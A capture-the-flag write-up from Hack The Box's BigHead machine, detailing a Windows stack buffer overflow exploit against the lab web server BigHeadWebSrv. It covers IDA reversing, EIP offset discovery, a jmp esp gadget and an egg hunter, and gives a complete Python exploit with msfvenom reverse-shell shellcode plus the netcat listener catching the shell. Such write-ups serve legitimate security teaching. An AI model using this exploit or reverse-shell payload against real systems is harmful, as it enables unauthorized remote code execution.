---
title: BigHead Exploit Dev
url: https://0xdf.gitlab.io/2019/05/04/htb-bighead-bof.html
date: 2019-05-04T14:45:00+00:00
tags: ctf, hackthebox, htb-bighead, bof, exploit, python, pwntools, immunity, mona, ida, reverse-engineering, mingw, nginx, pattern-create, egg-hunter
---

![](https://0xdfimages.gitlab.io/img/bighead-bof-cover.png) As my buffer overflow experience on Windows targets is relatively limited (only the basic vulnserver jmp esp type exploit previously), BigHeadWebSrv was probably the most complicate exploit chain I’ve written for a Windows target. The primary factor that takes this above something like a basic jmp esp is the space I have to write to is small. I got to learn a new technique, Egg Hunter, which is a small amount of code that will look for a marker I drop into memory earlier and run the shellcode after it.

## Reversing

### Strategy

The most common and probably fastest way to find a vulnerability in a program like this would be fuzz it until you find a crash, and then continue to send input and look at the resulting crashes in something like [Immunity Debugger](https://www.immunityinc.com/products/debugger/). This is exactly what they teach in day 3 of [Sans SEC660](https://www.sans.org/course/advanced-penetration-testing-exploits-ethical-hacking). This is a fine strategy, especially if your goal is to move fast through binaries that may or may not have overflows in them. In this case, where I have a known vulnerable binary and I’m fairly confident there’s a bug in it (the note in the final git commit beyond just it’s being here on a HackTheBox host), I like practicing my reverse engineering, so before I even set up a Windows VM, I’m going to fire up [the free version of IDA](https://www.hex-rays.com/products/ida/support/download_freeware.shtml) on Kali and see if I can find an overflow.

### Finding ConnectionHandler

I want to find the function that handles web requests, since that the way that I can interact with the server. If I find an overflow in the handling of command line arguments, that doesn’t help me at this point, as I can’t control that. There are a few ways to find the function that IDA labels as `_ConnectionHandler@4`. I’ll show three simple ways that I did it.

#### Strings

As soon as I open IDA, I’ll hit Shift-F12 to bring up the Strings window. About half way down, this block will jump out at me:

![1553943986408](https://0xdfimages.gitlab.io/img/1553943986408.png)

Those are clearly strings for parsing the HTTP request that’s incoming. That’s where my input with interact with the server, so I want to start there. I’ll pick `GET /coffee` since that’s the path that showed me the BigheadWebSrv in the first place.

When I double click on it, I’m taken to where that string is in memory, with several other strings right around it, and I can see this string sits at 0x004077F3:

![1553944114173](https://0xdfimages.gitlab.io/img/1553944114173.png)

IDA is also showing me there’s an cross reference (code that references 0x004077F3) in `_ConnectionHandler@4`.

If I click on `aGetCoffee` (it’ll highlight yellow) and then hit “x”, I’ll get a pop up with a list of places in the code this string is referenced:

![1553944359544](https://0xdfimages.gitlab.io/img/1553944359544.png)

In this case, it’s only once, so I’ll hit OK to go there in the code:

![1553944399173](https://0xdfimages.gitlab.io/img/1553944399173.png)

I’ll scroll up to the top of the function to see it’s been given the name `_ConnectionHandler@4` by IDA.

#### From the Top

Alternatively, when IDA loads, it starts me at `main`. I know this is a web server. So it’s likely going to create a socket, bind it to a post, listen, wait for connections, handle those connections by forking (in Windows that’s starting a thread). I see the overall flow of this function looks like this:

![1553944662084](https://0xdfimages.gitlab.io/img/1553944662084.png)

Without even looking at the assembly, I can make some guesses as to what’s going on.

![1553944708257](https://0xdfimages.gitlab.io/img/1553944708257.png)

If I scroll through the code itself, looking at the functions that are being called, I’ll see I basically got that right. I’ll also notice just after the args are processed, it prints a message with the server version and a warning that this software is vulnerable:

![1553945153807](https://0xdfimages.gitlab.io/img/1553945153807.png)

If I jump down to the section I have labeled in green in the image above, I’ll see the code that handles connections and the call to create a thread to handle the connection:

[![Ida create thread to handle connection](https://0xdfimages.gitlab.io/img/bighead-ida-accept-loop.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/bighead-ida-accept-loop.png)

The thread is passed the offset to `_ConnectionHander@4` as the code to run.

#### Functions Window

It’s also possible that I just look at the functions window and see the name IDA has give the function and guess that’s what handles the connection:

![1554116831557](https://0xdfimages.gitlab.io/img/1554116831557.png)

### Handler Logic

#### Overview

Now that I have the handler logic, I’ll try to understand it. Just like with `main`, I’ll start with the shape of the function and see if I can make a guess about what’s going on:

![](https://0xdfimages.gitlab.io/img/bighead-ida-handler-empty.png)

Immediately I see a bunch of comparisons (`if` statements), with a bunch of blocks at the end. I’ll guess that all those if statements are branching based on success/failure or `recv` and then different properties of the incoming HTTP request (GET vs POST, file exists, etc).

Starting from the top, I can quickly scan through and get the logic. I’m not trying to understand every bit of assembly, but rather just looking for a generate idea of what is branching where, and what I can rule out as interesting. Here’s an annotated version of the flow from above, and what I see:

![](https://0xdfimages.gitlab.io/img/bighead-ida-handler-annotated.png)
- (a) Set up two buffers and set them to 0. If some error code is -1, print error at (b) and return at (c).
- (d) check that the last memset returned ok, or else return at (c).
- (e) `recv` up to 0x20c (524) bytes into the first of the buffers, and check the return code. If 0 or an error (negative), jump to (f). At (f), if `recv` returned 0, go to (g), print “Connection closing”, close socket, and go to (c) to return. Else, go to (h), print value of receive error, close socket, and go to (c) to return.
- Check the length of the data received at (i). If it’s shorter than 0xdb (219) bytes, go to (j), else go to (k).
- At (j), check if the first five bytes of the request are “HEAD “. If so, go into the section I’ve marked in green. Else, go to (k).
- At (k), now handling all requests except a HEAD under 219 bytes, check request to start with six bytes, “GET / “ (with space after “/”). If so, go to (l) and send the response with the image of the guy with the drink, clean up, and return at (c). Otherwise, go to (m).
- At (m), check if the request starts with “GET /coffee”. If it matches, send the 418 response with the teapot gif at (n), then clean up and return at (c). This explains why `dirsearch` returned the same for `/coffee`, `/coffeecat`, `/coffeebreak`, and `/coffeecup`. Otherwise, go to (o).
- At (o), check if the request starts with “POST /”. If so, go to (p), which is exactly the same as (l), sending the guy with drink image. Otherwise, go to (q) and send a 404 message, clean up, and return at (c).

Very quickly, I’ve been able to rule out anything in the above flow as risky.

#### Short HEAD Requests

The remaining code (in green above) is called when there’s a HEAD request that’s less than 219 bytes long. I’ll just scan through this trying to get a high level idea of what it’s doing:

![](https://0xdfimages.gitlab.io/img/bighead-ida-head.png)
- At (a), the few three bytes of the second buffer from the original initialization are set to 0. Then, a new 12 byte buffer is created. Finally, two counters are initialized (EBP-C and EPB-10). I’ll refer to them as i and j. i is set to 6, and j 0.
- Now in (b), it’s the top of a loop. The byte `i` bytes into the request is loaded, and if it’s null, the loop breaks to (e). Otherwise, continue to (c), where the byte `i+1` bytes into the request checked, and if null, the loop breaks (e). Otherwise, continue to (d).
- (d) has a bunch going on:
  ![1554123846323](https://0xdfimages.gitlab.io/img/1554123846323.png)
  So, it’s converting from each two bytes from hex to a byte value, and storing it in a buffer on the heap. Then it goes back to the top of this local loop.
- At this point, I’m thinking I’m going to have a heap overflow here, as I can write well beyond the 12 bytes `malloced`. Still I’ll check out what happens once this loop completes, in (e).
- First, it calls `_Function4`, passing the new unhexed array as an argument. Then it sends the same 200 OK with guy with drink image, and prints some messages to the console. It moves on to (f), where it checks the return code from the send. If -1 (error), it goes to (g), prints more errors, cleans up, and returns. Otherwise, it goes back to the top of the loop and tries to read more.

A quick look at `_Function4`:

![1554124836518](https://0xdfimages.gitlab.io/img/1554124836518.png)

It basically does an unsafe `strcpy` from the buffer I control into a address on the stack. This is a clear case for an overflow that will overwrite the return pointer of this function. Phew. I can avoid heap overflows for today.

## Build Target VM

With a clear vulnerability here, time to set up a VM and get it working.

### Windows

I know from the phpinfo that I need a 32-bit Server 2008 machine. I can download an iso from Microsoft [here](https://www.microsoft.com/en-us/download/details.aspx?id=5023). I’ll create a new vm and install Windows from this iso.

### libmingwex-0.dll

Now I get the exe and the dll from GitHub (or move it over from my Kali host), and try to run it:

![1554132912906](https://0xdfimages.gitlab.io/img/1554132912906.png)

I need to install [MinGW](http://www.mingw.org/), which is a development environment for Windows modeled after GNU.

First, I’ll go [here](https://osdn.net/projects/mingw/releases) and download the MinGW Installation Manager. On running that, I’ll have access to the manager to look for additional libraries. I’ll click on “MinGW Libraries”, scroll down to “mingw32-libmingwex” (the dll, not the dev), right click, and select “Mark for Installation”.

![1554133251853](https://0xdfimages.gitlab.io/img/1554133251853.png)

Then I’ll go to “Installation” –> “Apply Changes”. After running that, I can see In the “Installed Files” tab the location of the dll that was missing:

![1554133333287](https://0xdfimages.gitlab.io/img/1554133333287.png)

Finally, I’ll need to add the new binary to my path. “Start” –> right click on “Computer” –> “Properties”. Click “Advanced System settings” –> “Environment Variables”. I’ll find the variable “Path” in the “System Variables” section, click “Edit”, and add `%SystemRoot%\MinGW\bin\` to the end of the current value.

Now I can run the server:

![1554133745377](https://0xdfimages.gitlab.io/img/1554133745377.png)

A quick netstat check shows it’s listening on 8008. I can get the page by pointing my browser at `127.0.0.1:8008` as well.

### Immunity

My preferred debugger for Windows is x64dbg (and x32dbg), and I recently learned that there is a version of `mona` supposedly ported to work for it. I haven’t had a chance to play with that, so here I’ll go with [Immunity](https://www.immunityinc.com/products/debugger/). Download and install it. I’ll grab [mona](https://github.com/corelan/mona) from GitHub and drop it into the “PyCommands” folder as instructed.

### nginx

I’ll first build something talking directly to the `BigHeadWebSvr`, but once I’m done, I’ll run it over `nginx`, as that will filter some bad requests out if I’m not careful. I’ll install `nginx`, and get it running using the config from GitHub. The first time I solved this I remember this caused me a great deal of issues. But in going back now and resolving it, and I don’t remember exactly what those issues where. I’ll need to make sure I send a valid http request with a valid url, and a url that is routed to `BigHeadWebSrv`, or else nginx will filter it before it gets to BigHeadWebSrv.

## Exploit Parts

### Find EIP Offset

First I need to find the offset to EIP. Because my input is translated from hex to binary before it overwrites, I’ll send in my input hex encoded. So I’ll make a pattern using `msf-pattern_create`, and then use `xxd` and `tr` to get it formatted how I need it:

```

root@kali# msf-pattern_create -l 50 | xxd -p | tr -d "\n"
41613041613141613241613341613441613541613641613741613841613941623041623141623241623341623441623541620a

```

I’ll fire up `BigHeadWedSvr.exe` and then attach Immunity to it. Note, sometimes to get Immunity to work, I’ll need to completely exit it, then start the web server, then start Immunity and attach. If I leave it open between runs, things get weird. Immunity isn’t the greatest.

Now I’ll send my pattern:

```

root@kali# curl --head http://10.1.1.146:8008/4161304161314161324161334161344161354161364161374161384161394162304162314162324162334162344162354162

```

In my Windows VM:

![1554139213884](https://0xdfimages.gitlab.io/img/1554139213884.png)

If I click ok and hit the run button, I’ll see EIP: ![1554139238133](https://0xdfimages.gitlab.io/img/1554139238133.png)

Because of the weird way I’m putting in bytes as hex in the url, I’ll need to reverse the byte order to use pattern offset:

```

root@kali# msf-pattern_offset -q 41326241
[*] Exact match at offset 36

```

So that’s 36 bytes, or 72 characters. I can verify (using 8 Bs to make 4 bytes):

```

root@kali# curl --head http://10.1.1.146:8008/$(python -c 'print "A"*72 + "B"*8')

```

![1554139443908](https://0xdfimages.gitlab.io/img/1554139443908.png)

### Find JMP ESP

Next I’ll look for a `jmp esp` gadget so that I can jmp back to my code once I gain execution. I’ll check out the modules using `!mona modules`:

[![Mona Modules](https://0xdfimages.gitlab.io/img/1554139883147.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/1554139883147.png)

I need to find the `jmp esp` inside of a module without ASLR, or else it doesn’t help me. Good options appear to be the exe itself, the associated dll, and the MinGW dll.

I can use `!mona jmp -r esp` to find a list of possible gadgets:

[![Mona jmp esp](https://0xdfimages.gitlab.io/img/1554140320135.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/1554140320135.png)

The first one looks fine, so I’ll go with 0x625012f0.

I can give it a test. With a break point at 0x625012f0:

```

root@kali# curl --head http://10.1.1.146:8008/$(python -c 'print "A"*72 + "f0125062" + "B"*8')

```

When it hits the break, I can see that my Bs are at ESP:

![1554141287373](https://0xdfimages.gitlab.io/img/1554141287373.png)

If I step forward, I see I’m running the Bs:

![1554141443675](https://0xdfimages.gitlab.io/img/1554141443675.png)

### Egg Hunter

Space is an issue. I’ll remember that to get to the vulnerable code, I have to send a HEAD request that is shorter than 219 bytes. So the first 6 bytes are gone for “HEAD /”, and I need at least one “\n” on the end. Now I’m down to 212 bytes. So my buffer looks like:

```

"HEAD /" + [72 bytes] + [JMP ESP, 8 bytes] + [132 bytes] + "\n"

```

I don’t have a lot of space here, especially remembering that the 72 byte and 132 byte buffers are actually half those sizes because they take input in hex, which is 2 bytes per byte.

`msfvenom` stages reverse meterpreter is 351 bytes. Staged reverse shell is 341. The unstaged shell is down to 324. Still, none of these are close to small enough to fit here.

This is where I’ll use an Egg Hunter. An Egg Hunter is a small bit of code that will search through memory for a specific string, and then jump to the code just after it. There are many pocs out there. `mona` has one built in, if I run `!mona egg -t 0xdf`:

![1554146083825](https://0xdfimages.gitlab.io/img/1554146083825.png)

I can use the 32-byte output there as my shellcode. But I still need a way to get my full payload into memory. The good news is that the memory isn’t reset or cleared between requests. So I can send a POST request with my payload, and it will likely still be in memory on my next request.

## Exploit

After a bunch of trial and error, I ended up with this script (it’s not my most beautiful work):

```

  1 #!/usr/bin/env python
  2 
  3 import os
  4 import subprocess
  5 import sys
  6 
  7 from pwn import *
  8 from time import sleep
  9 
 10 context(terminal=['tmux', 'new-window'])
 11 context(os='windows', arch="i386")
 12 
 13 
 14 def clean_and_exit(msg, files):
 15     print(msg)
 16     for f in files:
 17         try:
 18             os.remove(f)
 19         except:
 20             pass
 21     sys.exit()
 22 
 23 
 24 if len(sys.argv) != 5:
 25     clean_and_exit("%s [target] [target port] [callback ip] [callback port]" % (sys.argv[0]), [])
 26 
 27 target = sys.argv[1]
 28 port = sys.argv[2]
 29 cb_ip = sys.argv[3]
 30 cb_port = sys.argv[4]
 31 
 32 # Generate Shellcode 
 33 msfvenom_string = 'msfvenom -p windows/shell_reverse_tcp LHOST=%s LPORT=%s EXIT_FUNC=THREAD -a x86 --platform windows -b "\\x00\\x0a\\x0d" -f python -v shellcode -o sc.py' % (cb_ip, cb_port)
 34 print("[*] Generating shellcode:\n    %s" % msfvenom_string)
 35 p = subprocess.Popen(msfvenom_string.split(' '), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 36 out, err = p.communicate()
 37 
 38 try:
 39     if "Error" in err:
 40         raise Exception("[-] Unable to generate shellcode\n    %s" % err)
 41     from sc import shellcode
 42 except (NameError, Exception) as e:
 43     clean_and_exit(e.message, ['sc.py', 'sc.pyc'])
 44 
 45 print "[+] Shellcode generated successfully"
 46 os.remove('sc.py')
 47 os.remove('sc.pyc')
 48 
 49 # !mona egg -t
 50 egg = '0xdf'
 51 egghunter = "6681caff0f42526a0258cd2e3c055a74efb8" + egg.encode('hex') + "8bfaaf75eaaf75e7ffe7"
 52 
 53 nops = "\x90"*16
 54 spray = egg + egg + nops + shellcode
 55 post = 'POST / HTTP/1.1\r\nHost: dev.bighead.htb\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {}\r\n\r\n'.format(len(spray))
 56 spray_payload = post + spray
 57 
 58 head = "HEAD /"
 59 junk = "1" * (78-len(head))
 60 jmp_esp = "f0125062" #p32(0x625012f0)
 61 host = " HTTP/1.1\r\nHost: dev.bighead.htb\r\n\r\n"
 62 exec_payload = head + junk + jmp_esp + egghunter + host
 63 
 64 print("[*] Sending payload 5 times")
 65 for i in range(5):
 66     p = remote(target, port)
 67     #print(spray_payload)
 68     p.sendline(spray_payload)
 69     p.recv()
 70     p.close()
 71     sleep(0.1)
 72 
 73 print("[+] Payload sent.\n[*] Sleeping 1 second.")
 74 sleep(1)
 75 
 76 print("[*] Sending overflow + egghunter.")
 77 print("[*] Expect callback in 0-15 minutes to %s:%s." % (cb_ip, cb_port))
 78 p = remote(target, port)
 79 p.sendline(exec_payload)
 80 sleep(1)
 81 p.recv()
 82 p.close()

```

Comments:
- Lines 15-48 are just about generating the shellcode and cleaning up.
- Lines 50-73 set up the upcoming web requests.
- Lines 65-72 send the POST with the shell 5 times
- Lines 77-83 send the HEAD with the egg hunter payload.

In hindsight, I didn’t really use the `pwntools` stuff, and I wish I had just built it with `requests`.

But, it works:

```

root@kali# python pwn_bighead.py dev.bighead.htb 80 10.10.14.14 443
[*] Generating shellcode:
    msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=443 EXIT_FUNC=THREAD -a x86 --platform windows -b "\x00\x0a\x0d" -f python -v shellcode -o sc.py
[+] Shellcode generated successfully
[*] Sending payload 5 times
[+] Opening connection to dev.bighead.htb on port 80: Done
[*] Closed connection to dev.bighead.htb port 80
[+] Opening connection to dev.bighead.htb on port 80: Done
[*] Closed connection to dev.bighead.htb port 80
[+] Opening connection to dev.bighead.htb on port 80: Done
[*] Closed connection to dev.bighead.htb port 80
[+] Opening connection to dev.bighead.htb on port 80: Done
[*] Closed connection to dev.bighead.htb port 80
[+] Opening connection to dev.bighead.htb on port 80: Done
[*] Closed connection to dev.bighead.htb port 80
[+] Payload sent.
[*] Sleeping 1 second.
[*] Sending overflow + egghunter.
[*] Expect callback in 0-15 minutes to 10.10.14.14:443.
[+] Opening connection to dev.bighead.htb on port 80: Done

```

A few minutes later:

```

root@kali# rlwrap nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.112.
Ncat: Connection from 10.10.10.112:49200.
Microsoft Windows [Version 6.0.6002]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\nginx>whoami
piedpiper\nelson

```

[« BigHead Walkthrough](/2019/05/04/htb-bighead.html)